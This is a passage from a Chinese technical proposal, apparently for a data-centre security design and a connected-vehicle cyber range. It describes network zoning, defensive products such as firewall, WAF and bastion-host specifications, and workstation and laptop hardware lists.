"https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/6dd6a7898c5a63a67bbcb1ffc7bd2d38.png"></p><p>数据中心整体安全设计</p><h4 id="安全通信网络"><a href="#安全通信网络" class="headerlink" title="安全通信网络"></a>安全通信网络</h4><h5 id="功能实施方案-20"><a href="#功能实施方案-20" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><ol><li>网络安全是在当今数字化世界中维护数据完整性、保密性和可用性的重要组成部分。在设计网络架构时，必须从多个层面考虑安全性，包括但不限于数据在传输过程中的加密、对敏感数据的访问控制、以及确保通信双方身份的认证和授权机制。加密算法的使用是保护数据传输安全的基石，它通过复杂的数学运算确保即使数据在传输过程中被截获，未授权者也无法解读其内容。此外，访问控制策略确保只有得到授权的用户才能访问特定的网络资源，这通常涉及到多因素认证、权限管理和用户行为监控等技术。认证和授权机制的实施则进一步确保所有尝试访问系统的个体都能被准确地识别和验证，防止未授权的访问和潜在的内部威胁。</li><li>网络域的划分是确保网络安全和高效管理的关键策略。通过将网络按照业务功能、服务等级和安全需求进行逻辑或物理划分，组织可以更有效地监控和管理网络流量，同时限制潜在的安全威胁仅在局部范围内传播。例如，通过设置不同的虚拟局域网（VLANs），可以在不同部门或项目组之间建立安全边界，同时利用路由器和防火墙的访问控制列表（ACLs）来限制跨域访问，增强安全性。这种划分不仅有助于隔离敏感数据，减少跨网络的不必要通信，还能提升网络性能，确保关键业务系统的顺畅运行。</li><li>为了保证网络在业务高峰期的性能，必须对网络的带宽需求进行精确的评估和规划。这包括对网络流量的持续监控、预测未来增长趋势、以及及时升级网络设施以应对预期的负载。网络管理员需要定期进行网络性能评估，利用流量分析工具来识别流量模式，并据此调整网络配置，如优化路由协议、增加带宽容量或部署负载均衡器。同时，灾难恢复计划和冗余设计也是确保网络可用性的关键，特别是在面对硬件故障、服务攻击或其他突发事件时。通过对关键网络组件的冗余配置，可以在设备或路径出现故障时快速切换，保持业务的持续运行。</li><li>远程访问系统的安全构建是一个复杂的过程，它需要综合考虑用户身份验证、数据传输安全、终端安全以及网络访问控制等多个方面。在众测期间，特别需要对白帽子黑客的行为进行严格的审计和监控，以确保他们在探索系统漏洞时不会对系统造成不可预期的损害。这通常涉及到日志管理、行为分析、入侵检测系统（IDS）和入侵防御系统（IPS）的部署。此外，确保测试环境与生产环境的隔离也至关重要，以避免测试活动影响到正常的业务运行。通过使用虚拟私人网络（VPN）和防火墙来限制远程访问权限，以及实施端点保护策略，可以在不牺牲用户体验的前提下，保护企业资产免受不必要的风险。</li></ol><h4 id="安全区域边界"><a href="#安全区域边界" class="headerlink" title="安全区域边界"></a>安全区域边界</h4><h5 id="功能实施方案-21"><a href="#功能实施方案-21" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><p>安全域划分的目的是从信息安全的角度来对企业信息系统进行拆分。以业务系统为核心，从业务特性、技术特性方面分析各业务系统的安全需求和防护等级，进行适当的安全防护体系设计。</p><ol><li>安全区域边界的能力是为了确保网络环境的安全性，避免非的攻击入侵，如非授权攻击等问题。边界防护作为首要防线，不仅要阻止不安全的流量进入网络，还要确保敏感数据不会泄露到外部环境。访问控制则通过一系列的身份验证和授权步骤来实现，确保只有合法用户和设备才能访问网络资源。此外，入侵防范系统（IPS）能够实时监控网络活动，自动识别并阻止潜在的攻击行为。恶意代码防护则涉及到防病毒、反间谍软件和其他恶意软件的防御措施，这些措施需要不断更新以对抗日益狡猾的恶意软件和零日攻击。</li><li>互联网边界安全是对抗外部威胁的关键环节。网络入侵防御系统（IDS）和分布式拒绝服务（DDoS）防护是保护网络不受恶意流量影响的重要组成部分。IDS监测所有进入和离开网络的数据包，寻找可能的攻击迹象，而DDoS防护则旨在识别并缓和大量的恶意流量，保障网络的正常运行。同时，网络边界还应具备能力阻断恶意访问和威胁URL，这通常通过部署先进的防火墙和网关设备来实现，这些设备能够根据安全策略对流量进行深度检查和过滤。</li><li>对于对外提供服务的系统，如网站和在线应用，安全防护能力尤为关键。这类系统常常面临网络攻击和数据泄露的风险，因此需要采取额外的安全措施。这些措施包括但不限于安全套接字层（SSL）加密、网页应用防火墙（WAF）和定期的安全漏洞扫描。SSL确保数据在传输过程中的加密，而WAF则保护应用免受跨站脚本（XSS）、SQL注入等常见攻击。定期的安全评估和漏洞扫描能够帮助识别并修补安全漏洞，从而降低被攻击的风险。</li><li>网络流量监测和高级威胁防御是现代网络安全的关键组成部分。通过部署先进的威胁检测和响应系统，安全团队能够对网络流量进行持续监控，及时发现并响应可疑活动。这些系统利用行为分析、沙箱技术和人工智能算法来检测复杂的攻击模式，包括APT（高级持续性威胁）和零日攻击。当可疑活动被检测到时，安全团队可以迅速采取行动，如隔离受影响的系统、分析攻击载荷和通报相关的威胁情报，从而防止或减轻安全事件的影响。</li></ol><h5 id="技术实现内容-6"><a href="#技术实现内容-6" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><h6 id="边界接入区"><a href="#边界接入区" class="headerlink" title="边界接入区"></a>边界接入区</h6><p>互联网接入区</p><p>承载组织与互联网的连接，组织向公共用户提供对外业务服务的通道。</p><p>外联接入区</p><p>承载组织与外部第三方机构的信息交换，如电子政务专网、监管机构、合作机构等。</p><p>部接入区</p><p>承载组织部的分支机构、灾备中心之间的信息交换，以及组织人员从外部接入的通道。</p><h6 id="外联接入区"><a href="#外联接入区" class="headerlink" title="外联接入区"></a>外联接入区</h6><p>外联接入区主要面临的威胁来自于外联机构，通常外联机构使用专线或者VPN连接到数据中心，访问特定的业务系统。对于外联接入区的安全设计主要从访问控制方面重点考虑。</p><p>部署智慧防火墙，实现端口级的访问控制，并开启应用层防护功能，对来自外部机构的恶意代码、高级威胁等进行检测和拦截。</p><h6 id="互联网接入区"><a href="#互联网接入区" class="headerlink" title="互联网接入区"></a>互联网接入区</h6><p>互联网接入区主要面临来自互联网的安全威胁，对于互联网接入区的安全设计主要从以下两方面考虑：</p><ul><li>防DDoS攻击（分布式拒绝服务攻击）。DDOS攻击分为带宽消耗型攻击（大流量攻击）和主机资源消耗型攻击，带宽消耗型攻击会对数据出口造成流量压力，极大浪费宝贵的带宽资源，严重增加核心设备的工作负荷，造成关键业务的中断或网络服务质量的大幅降低。主机资源消耗型攻击使服务器处理大量并发攻击请求，严重影响服务器存、数据库、CPU的处理性能。 DDoS攻击会造成门户、网络设备、虚拟服务器等性能均急剧下降，可能导致无常处理用户的正常访问请求，造成客户访问失败。</li><li>未知威胁检测与响应。互联网边界是威胁的重要入口之一，同时也是数据泄露的主要出口之一。尤其是当前APT攻击盛行，各类未知威胁对核心数据安全造成巨大的危害。网关层面应当具备对未知威胁的检测能力，并能实现联动响应机制，拦截掉威胁进出的路径。</li><li>在互联网边界部署抗DDoS系统，对来自外部的DDoS攻击进行实时的阻断。</li><li>部署智慧防火墙，实现高性能的应用层安全防护，以及与安全运营平台进行联动，实现网关处的未知威胁处置。</li></ul><h6 id="网络基础设施区"><a href="#网络基础设施区" class="headerlink" title="网络基础设施区"></a>网络基础设施区</h6><ul><li><p>核心汇聚区</p><p>数据中心的网络汇聚中心，各个区域之间的数据流传都会经过核心汇聚区。通常在此区域进行网络流量的安全监控。</p></li><li><p>区域接入区</p><p>主要是各个安全区部接入的路由交换设备，通常在此区域部署网络接入控制等措施。</p></li></ul><h6 id="业务接入区"><a href="#业务接入区" class="headerlink" title="业务接入区"></a>业务接入区</h6><ul><li><p>一般服务区</p><p>用于存放防护级别较低，需直接对外提供服务的信息资产，如Web应用、业务前置机、办公服务器等，一般服务区与外界有直接连接，同时不能够访问核心数据区（避免被作为攻击核心数据区的跳板）。</p></li><li><p>重要服务区</p><p>用于存放级别较高，不需要直接对外提供服务的信息资产，如生产应用服务器等，重要服务区一般通过一般服务区与外界连接，并可以直接访问核心数据区。</p></li><li><p>核心数据区</p><p>用于存放级别非常高的信息资产，如核心数据库等，外部对核心区的访问需要通过重要服务区跳转。</p></li></ul><h6 id="运维管理区"><a href="#运维管理区" class="headerlink" title="运维管理区"></a>运维管理区</h6><p>运维管理区通常承载网络管理、安全管理和业务运维等应用，运维人员通过本区域的管理平台对网络设备、服务器、安全产品进行管理。如各类设备的日志存储、安全管理平台、各类监控系统等。</p><h6 id="内部接入区"><a href="#内部接入区" class="headerlink" title="内部接入区"></a>内部接入区</h6><p>内部接入区主要面临的威胁来自于远程接入带来的风险，如传输过程的信道监听、员工远程接入后的权限滥用等。部接入区的安全设计主要考虑远程安全接入中的访问控制、权限管理、传输加密等方面。</p><ul><li>部署VPN接入网关，实现对分支机构接入的访问控制、权限管理，并且采用链路加密技术保证敏感信息的传输安全。</li><li>部署智慧防火墙，支持对穿过防火墙的SSL协议进行解密，并对解密后的数据提供防护过滤，如攻击防护、入侵检测、病毒防护、容过滤等。</li></ul><h6 id="核心汇聚区"><a href="#核心汇聚区" class="headerlink" title="核心汇聚区"></a>核心汇聚区</h6><p>核心汇聚区的安全设计主要考虑从全网流量中对各类威胁进行识别检测，及时发现攻击行为并向安全运营中心进行告警。</p><p>本区域安全设计如下图所示：</p><ul><li>在核心交换机上旁路部署天眼网络威胁传感器。通过流量镜像接收全网的通信数据流，对各类网络行为进行还原，从中识别各类已知威胁生成告警；还可以通过与威胁情报中心下发到本地的威胁情报进行比对，识别未知威胁；同时全量网络数据存储在本地大数据分析平台，可以对威胁进行溯源。</li><li>部署文件威胁鉴定器。网络威胁传感器识别到网络流量中的文件传输行为后，会将文件还原并发送至文件威胁鉴定器，进行深度分析。文件威胁鉴定器会对PE文件、脚本文件等进行模拟运行，通过文件运行过程中执行的操作行为进一步识别潜在的威胁。</li></ul><h6 id="一般服务区"><a href="#一般服务区" class="headerlink" title="一般服务区"></a>一般服务区</h6><p>一般服务区通常承载了对外的Web类应用，主要面临的威胁有以下两方面：</p><ol><li>应用安全风险，主要由于应用软件的漏洞造成。任何一种软件或多或少存在一定脆弱性，安全漏洞可视作已知系统脆弱性。这种安全漏洞可分为两种：一种是由于操作系统本身设计缺陷带来的漏洞，它将被运行在这个系统上的应用程序所继承，另一种是应用软件程序安全漏洞，很常见，更要引起广泛关注。</li><li>主机安全风险。包括两方面：一是物理机与虚拟机操作系统的恶意代码防。二是由于服务器虚拟化技术带来的新型风险，如东西向流量的访问控制、虚拟机逃逸漏洞、虚拟机漂移导致安全策略失效等。</li></ol><h4 id="计算环境能力"><a href="#计算环境能力" class="headerlink" title="计算环境能力"></a>计算环境能力</h4><h5 id="功能实施方案-22"><a href="#功能实施方案-22" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><ol><li>确保承载业务运行的主机和服务器的安全性是保护组织免受网络威胁的关键，具备对承载业务运行主机及服务器的安全防护能力，提供全面的杀毒、加固和检测功能。这包括实时监测和防御病毒威胁，加强系统安全性，以及定期进行漏洞扫描和安全审计，确保业务运行的稳定和安全，包括：</li><li>防恶意应用及病毒</li><li>操作系统和应用程序加固</li><li>入侵检测和防御系统（IDS/IPS）</li><li>防火墙配置</li><li>能够对核心运维及测试终端进行全面防护和审计，实现防病毒、软件分发及正版化管理、终端运维管控以及终端行为审计管理等功能。通过这些措施，可以有效地保护终端设备免受恶意软件的攻击，确保系统的正常运行和数据的完整性。</li><li>具备对系统漏洞进行全面监测的能力，通过实时监测和预警系统，及时发现和处理潜在的安全风险。这将有助于预防潜在的安全威胁，并确保系统的安全性和稳定性，对核心运维及测试终端进行全面防护和审计，并实现对终端的防病毒、软件分发及正版化管理、终端运维管控、终端行为审计管理等能力。</li><li>具备对业务数据库访问行为进行审计和风险评估的能力，保障核心数据的安全。通过对数据库访问行为的监控和分析，及时发现异常行为并进行风险评估，从而确保核心数据的安全性和完整性，为了对业务数据库的访问行为进行审计和风险评估，以保障核心数据的安全，需要实施一系列的策略和工具：</li><li>数据库访问控制</li><li>审计策略制定</li><li>数据库活动监控</li><li>日志管理</li><li>定期审计和检查</li><li>风险评估</li><li>数据分类和标签</li></ol><h4 id="安全产品防护能力"><a href="#安全产品防护能力" class="headerlink" title="安全产品防护能力"></a>安全产品防护能力</h4><h5 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h5><h6 id="功能实施方案-23"><a href="#功能实施方案-23" class="headerlink" title="功能实施方案"></a>功能实施方案</h6><p>防火墙是一种高性能网络安全设备，主要用于监控和控制网络流量，以保护网络免受未经授权的访问、恶意攻击和不良内容的影响。防火墙通过建立规则和策略，过滤和阻止不符合规则的网络流量，从而维护网络的安全性和完整性。</p><ol><li>采用ARM架构，ARM架构是一种精简指令集计算机（RISC）架构，广泛应用于移动设备、嵌入式系统、服务器和超级计算机中，属于非X86多核架构。</li><li>支持一对多、多对一，多对多的NAT能力、IPSec、L2TP、GRE、SSL等多种VPN技术、IPv6协议、虚拟防火墙功能、用户行为审计、网络数据统计评估能力，这是一组网络功能，旨在提供灵活的地址转换、安全的远程连接、下一代IP支持、隔离和监控的虚拟化安全措施以及对用户活动和网络流量的详细分析。</li></ol><h6 id="性能实施方案"><a href="#性能实施方案" class="headerlink" title="性能实施方案"></a>性能实施方案</h6><ol><li>数据吞吐量40Gbps，最大并发连接数1600万，每秒新建连接数50万，这是一款高性能网络设备的规格，能够处理每秒40吉比特的数据传输，支持高达1600万个同时活跃连接，并能每秒创建50万个新连接。</li></ol><h5 id="Web应用防护系统"><a href="#Web应用防护系统" class="headerlink" title="Web应用防护系统"></a>Web应用防护系统</h5><h6 id="功能实施方案-24"><a href="#功能实施方案-24" class="headerlink" title="功能实施方案"></a>功能实施方案</h6><p>WEB应用防护系统采用国利自主研发的WAF防护管理平台，该平台是一种专门用于保护Web应用程序免受恶意攻击的安全设备或软件。WAF通过监控、检测和阻止对Web应用程序的攻击，提供了一层额外的安全防护。</p><ol><li>该Web应用防护系统（WAF）具备自学习智能创建访问源树形结构的功能。通过自动学习网络流量模式，系统能够快速准确地识别和分类流量，从而更好地防御各种网络威胁。</li><li>该WAF支持创建黑白名单功能。黑名单可以用于屏蔽已知的恶意IP地址或域名，而白名单则可以确保只有受信任的来源能够访问应用程序。这有助于提高系统的安全性，减少潜在的攻击风险。</li><li>该WAF支持自动阻断判断为非法的流量。通过实时监测网络流量，系统能够自动识别并阻断恶意请求或攻击流量，从而保护Web应用程序免受潜在威胁。</li><li>该WAF支持旁路镜像模式下的攻击阻断、端口联动和虚拟补丁等功能。旁路镜像模式允许系统在不干扰现有网络流量的前提下进行监测和防护。攻击阻断功能能够实时识别并防御各种攻击行为，端口联动可以确保系统的防御能力覆盖多个端口，而虚拟补丁则可以在已知漏洞存在的情况下提供临时的防护措施。</li></ol><h6 id="性能实施方案-1"><a href="#性能实施方案-1" class="headerlink" title="性能实施方案"></a>性能实施方案</h6><ol><li>该Web应用防护系统（WAF）应具备1Gbps的HTTP吞吐量，以满足高带宽数据传输的需求。同时，HTTP并发连接数60万，确保系统能够处理大量并发请求，保持高可用性。此外，HTTP每秒新建连接数应于4万，以快速响应新的请求并提高系统的响应能力。这些参数保证了WAF在面对高流量和并发请求时仍能保持高效稳定的运行。</li></ol><h5 id="堡垒机"><a href="#堡垒机" class="headerlink" title="堡垒机"></a>堡垒机</h5><h6 id="功能与性能参数需求"><a href="#功能与性能参数需求" class="headerlink" title="功能与性能参数需求"></a>功能与性能参数需求</h6><ol><li>≥6个千兆电口，≥4个千兆光口</li><li>可管理设备数量≥500个，运维用户无限制</li><li>支持多因子认证，包括手机令牌、手机短信、动态令牌、国密USBKey、指纹识别等方式</li><li>系统内置部门管理员、策略管理员、审计管理员、运维员等角色，并支持按模块和功能自定义角色权限，便于管理，用于复杂的业务场景需求支持角色权限细粒度划分，包括新建部门、安全配置、网络配置、HA配置、端口配置、外发配置、认证配置、工单配置、告警配置、系统风格等权限划分</li><li>支持对MySQL、Oracle和达梦数据库的访问操作进行控制，可基于库、表、命令实现对数据库操作的细粒度访问控制，执行动作包括但不限于断开连接、拒绝执行、动态授权、允许执行</li><li>支持以部门、资源账户、账户组、时间、改密周期、改密方式生成详细的改密计划，到期自动执行</li><li>支持H5运维过程中通过群发命令，实现同时运维多台资源设备</li><li>支持在线回放运维人员对资源的操作过程，并可以对播放速度进行调整，支持拖动、暂停、停止、跳过空闲、重新播放、截屏、切换会话等操作，支持运维记录按照允许 执行、动态授权、拒绝执行、断开连接等进行筛选，支持文件传输按照上传文件（夹）、下载文件（夹）、重命名文件（夹）、删除文件（夹）、创建文件夹进行筛选，支持审计协同用</li><li>支持对用户从主机上下载或上传到主机的文件进行保存，可灵活设置保存文件的大小（支持单文件或会话级别限制），可自动计算文件的SHA256值。</li></ol><h6 id="功性能实施方案"><a href="#功性能实施方案" class="headerlink" title="功性能实施方案"></a>功性能实施方案</h6><p>堡垒机可以用于增强网络安全性，它位于网络的边界或关键位置，作为安全访问点来管理和控制对内部网络的访问。</p><ol><li>提供的设备具备6个千兆电口和4个千兆光口，以满足多样化的网络连接需求。这样的接口配置可以支持各种不同类型的网络设备和终端接入，确保网络通信的稳定性和高效性</li><li>具备管理设备数量1000个的能力，并支持运维用户无限制。这意味着堡垒机能够管理大量的网络设备和终端，并允许多个运维用户同时进行操作，满足大规模网络管理的需求</li><li>支持多因子认证，包括手机令牌、手机短信、动态令牌、国密USBKey、指纹识别等方式。多因子认证增强了系统的安全性，通过多种认证方式的结合使用，可以提供更加严密的安全防护，保护网络资源不被未经授权的用户访问，截图如下所示：</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/c42c3d76e9ed9c11513893f95acf9bd9.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/787b18f212562a6195a30b3b6dc82e3e.png" alt="企业微信截图_17053341364224"></p><ol><li>系统内置部门管理员、策略管理员、审计管理员、运维员等角色，并支持按模块和功能自定义角色权限。这种角色权限管理功能可以满足复杂的业务场景需求，方便管理员根据实际需求进行细粒度的权限划分和控制，确保不同用户只能访问其权限范围内的资源。系统内置部门管理员、策略管理员、审计管理员、运维员等角色，并支持按模块和功能自定义角色权限，便于管理，用于复杂的业务场景需求支持角色权限细粒度划分，包括新建部门、安全配置、网络配置、HA配置、端口配置、外发配置、认证配置、工单配置、告警配置、系统风格等权限划分，截图如下所示：</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/0f74fa45f4a3846c0a44debbd138eee2.png"></p><ol><li><p>支持对MySQL、Oracle和达梦数据库的访问操作进行控制，可基于库、表、命令实现对数据库操作的细粒度访问控制。这使得堡垒机能够对数据库访问进行严格的控制和管理，限制未授权用户的访问和操作，确保数据库的安全性和完整性。同时，执行动作包括但不限于断开连接、拒绝执行、动态授权、允许执行等，使得管理员可以根据具体情况灵活地进行权限控制和调整，截图如下所示：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/238c8db271eb16b1564d7e576db1576f.png"></p><p>MySQL<img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/087c573315c178c1464633dd4744bcb4.png"></p><p>Oracle</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/3b90574eff276ca1375480dd3495de15.png"></p><p>达梦数据库</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/cbd43f0ecf0fa71f14da48c973d36657.png"></p><p>基于库、表、命令定义数据库操作的控制规则</p></li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/18b6f624f191f5afa7813d63de040ee1.png"></p><p>执行动作</p><ol><li>支持以部门、资源账户、账户组、时间、改密周期、改密方式生成详细的改密计划，并到期自动执行。这种自动化的改密计划管理功能可以减轻管理员的工作负担，提高密码管理的安全性和可靠性。通过设置合理的改密计划和自动执行，可以确保密码定期更新，降低密码泄露的风险。</li><li>持在H5运维过程中通过群发命令，实现同时运维多台资源设备。这种群发命令功能可以提高运维效率，使管理员能够快速地对多台设备进行统一的管理和操作。通过发送相同的命令或配置到多台设备，可以快速地部署和更新设备，减少重复的运维工作。</li></ol><p>支持在线回放运维人员对资源的操作过程，并可以对播放速度进行调整，支持拖动、暂停、停止、跳过空闲、重新播放、截屏、切换会话等操作，支持运维记录按照允许 执行、动态授权、拒绝执行、断开连接等进行筛选，支持文件传输按照上传文件（夹）、下载文件（夹）、重命名文件（夹）、删除文件（夹）、创建文件夹进行筛选，支持审计协同用。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/5fbde35ac637babefc4e3f348392bbec.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/83f4686c95d0876147321110b0827d82.png" alt="IMG_256"></p><ol><li>支持对用户从主机上下载或上传到主机的文件进行保存，可灵活设置保存文件的大小（支持单文件或会话级别限制），可自动计算文件的SHA256值。这种文件管理功能可以加强堡垒机对文件操作的监控和管理，确保文件的完整性和安全性。通过限制文件大小和灵活的文件保存设置，可以防止大文件传输对网络资源的占用和浪费。同时，自动计算文件的SHA256值可以为文件校验和安全性提供保障，确保文件的真实性和未被篡改，截图如下所示：</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/c3d1d65fdecb2681317e8340325cd5d6.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/11a283b5f9adc70ac06f68a7f5060e03.png" alt="IMG_256"></p><p>文件限制</p><h3 id="其他资产设备"><a href="#其他资产设备" class="headerlink" title="其他资产设备"></a>其他资产设备</h3><h4 id="工作站"><a href="#工作站" class="headerlink" title="工作站"></a>工作站</h4><h5 id="功能实施方案-25"><a href="#功能实施方案-25" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><p>工作站选用19台品牌为：，型号为：定制的工作站。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/f3464e778ac28abf368e1a281136eb92.png"></p><p>功能参数如下：</p><ol><li>该工作站支持windos11操作系统，以确保与最新的操作系统兼容，提供稳定和高效的工作环境。</li><li>该工作站配备CPU性能i7-13700K，加速频率5.0GHz。这种高性能的CPU可以满足各种复杂的计算和数据处理需求，提高整体的工作效率。</li><li>该工作站支持HDMI2.0接口，以确保能够支持高清视频输出和连接外部显示设备。</li><li>该工作站支持2个USB3.0接口，以满足各种外设的连接需求，提供高速的数据传输能力。</li><li>该工作站具备1个RJ45接口，以便连接网线进行网络通信和数据传输。</li><li>该工作站配备64GB DDR4内存，以提供充足的处理能力和多任务处理能力，满足各种高负载的应用需求。</li><li>该工作站配置1TB SSD硬盘，以提高存储速度和读写性能，确保流畅的系统运行和快速的数据存取。</li><li>该工作站应配置NVIDIA® Geforce® RTX 4060显卡，8G独显，以提供强大的图形处理能力，支持各种高负载的图形应用和游戏。</li><li>该工作站支持配置Linux虚拟机环境，并且保证运行靶场、运维所需的硬件软件。这可以满足多种操作系统和虚拟化环境的需求，提高灵活性和可扩展性。</li><li>该工作站满足对车辆渗透测试所需的软件及环境，以确保能够进行有效的车辆渗透测试和安全评估。</li></ol><h4 id="显示器"><a href="#显示器" class="headerlink" title="显示器"></a>显示器</h4><h5 id="功能实施方案-26"><a href="#功能实施方案-26" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><p>显示器选用26台品牌为：戴尔，型号为：定制的显示器。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/c766387ca3f84e0c7ea56d41e9c778e5.png"></p><p>产品功能参数如下：</p><ol><li>该工作站配备的电视屏幕31.5英寸，以提供足够大的显示区域，使用户能够清晰地查看和操作界面，从而提升工作效率和用户体验。</li><li>该工作站支持VGA/DP、HDMI接口，这些多样化的接口配置可以确保与各种外部设备的兼容性，方便用户根据实际需求连接不同类型的显示设备或数据传输设备。</li><li>该工作站的刷新频率60Hz，以保证屏幕显示的流畅性和稳定性，避免出现画面撕裂或延迟等问题，从而为用户提供更加顺畅的视觉体验。</li><li>该工作站满足重量不低于10kg的要求，以确保其稳定性和耐用性。较重的工作站通常意味着更扎实的用料和更高的品质标准，能够经受住长时间高强度使用的考验。</li><li>该工作站的分辨率4K，以提供足够细腻的画质表现。高分辨率的屏幕可以显示更多的内容和细节，使用户能够更加清晰地查看和处理图像、文本等信息，从而提升工作效率和准确性。</li></ol><h4 id="移动终端"><a href="#移动终端" class="headerlink" title="移动终端"></a>移动终端</h4><h5 id="功能实施方案-27"><a href="#功能实施方案-27" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><ol><li>移动终端选用8台品牌为：联想，型号为：ThinkPad T14 的移动终端。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/dc25bb8674c46d17f54a712408f6d68e.png"></p><p>产品功能参数如下：</p><ol><li>该移动终端支持windos操作系统，Windows操作系统具有较高兼容性，提供稳定和高效的工作环境。</li><li>该移动终端配备CPU性能i7-1260P，主频2.1GHz。这种高性能的CPU可以满足各种复杂的计算和数据处理需求，提高整体的工作效率。</li><li>该移动终端配备14英寸的屏幕，分辨率2240×1400。大屏幕和高分辨率可以提供更宽广的视野和更清晰的图像，使用户能够更加舒适地阅读、编辑和观看内容。</li><li>该移动终端支持HDMI 2.0接口和SD读卡器接口，以满足各种外设的连接需求，提供高速的数据传输能力。</li><li>该移动终端支持2个USB3.0接口，以满足各种外设的连接需求，提供高速的数据传输能力。</li><li>该移动终端具备1个RJ45接口，以便连接网线进行网络通信和数据传输。</li><li>该移动终端支持1个ThunderBolt 4.0接口，以满足高速数据传输和设备扩展的需求。</li><li>该移动终端配备64GB DDR4内存，以提供充足的处理能力和多任务处理能力，满足各种高负载的应用需求。</li><li>该移动终端配置1TB SSD硬盘，以提高存储速度和读写性能，确保流畅的系统运行和快速的数据存取。</li><li>该移动终端配置NVIDIA® Geforce® MX550显卡，2G显存。强大的显卡配置可以提供高效的图形处理能力，支持各种高负载的图形应用和游戏。</li><li>该移动终端支持蓝牙BT5.0，以确保与蓝牙设备的兼容性和稳定的无线连接。</li><li>提供1台品牌为：Apple，型号为：macbook pro的移动终端</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/79399b42af9b129e74acdbd77dbb2f6d.png"></p><p>产品功能参数如下：</p><ol><li>该移动终端支持macOS操作系统，以确保与苹果电脑的兼容性，提供稳定和高效的工作环境。</li><li>该移动终端配备处理器Apple M2 Pro，以提供强大的计算性能和高效的能源效率。</li><li>该移动终端具备12核中央处理器，以满足多任务处理和高负载运算的需求。</li><li>该移动终端具备19核图像处理器，以提供强大的图像处理能力，支持高质量的视频编辑和渲染。</li><li>该移动终端具备16核神经网络引擎，以加速机器学习和人工智能相关的任务处理。</li><li>该移动终端配备屏幕尺寸16英寸的显示器，以提供更大的视野和更舒适的观看体验。</li><li>该移动终端具备视网膜XDR显示屏，以提供高清晰度和细腻的画质表现。</li><li>该移动终端支持H.264、HEVC、ProRes和ProRes RAW硬件加速，以满足各种视频编码和编辑的需求。</li><li>该移动终端配备内存32G，以提供充足的处理能力和多任务处理能力，满足各种高负载的应用需求。</li><li>该移动终端配置硬盘1TB SSD，以提高存储速度和读写性能，确保流畅的系统运行和快速的数据存取。</li><li>该移动终端支持1个HDMI端口，以满足各种外设的连接需求，提供高速的数据传输能力。</li><li>该移动终端支持3个USB-C端口，以满足各种外设的连接需求，提供高速的数据传输能力。</li><li>该移动终端在初始分辨率下支持10亿色彩，以提供更加丰富和细腻的色彩表现。</li><li>该移动终端支持的格式包括HEVC、H.264和ProRes，以满足各种视频格式的需求和处理。</li><li>该移动终端支持杜比视界、HDR10和HLG，并可显示HDR画质，以提供高动态范围和高清晰度的视觉体验。</li><li>该移动终端支持Wi-Fi 6E (802.11ax)，以确保稳定的无线连接和高速度的网络传输。</li><li>该移动终端支持蓝牙5.3的版本，以满足无线连接和设备兼容性的需求。</li><li>该移动终端的工作温度在10°C至35°C（50°F至95°F）之间，以确保在正常的环境温度下稳定运行。</li><li>该移动终端的存放温度在-25°C至45°C（-13°F至113°F）之间，以确保在广泛的环境温度下安全存放。</li><li>该移动终端配备100瓦时锂聚合物电池，以满足长时间使用的需求和提供稳定的电力供应。</li></ol><h1 id="智能驾驶网络靶场沙盘"><a href="#智能驾驶网络靶场沙盘" class="headerlink" title="智能驾驶网络靶场沙盘"></a>智能驾驶网络靶场沙盘</h1><h2 id="技术路线-2"><a href="#技术路线-2" class="headerlink" title="技术路线"></a>技术路线</h2><h3 id="智能驾驶网络安全沙盘"><a href="#智能驾驶网络安全沙盘" class="headerlink" title="智能驾驶网络安全沙盘"></a>智能驾驶网络安全沙盘</h3><h4 id="沙盘技术方案"><a href="#沙盘技术方案" class="headerlink" title="沙盘技术方案"></a>沙盘技术方案</h4><h5 id="功能实施方案-28"><a href="#功能实施方案-28" class="headerlink" 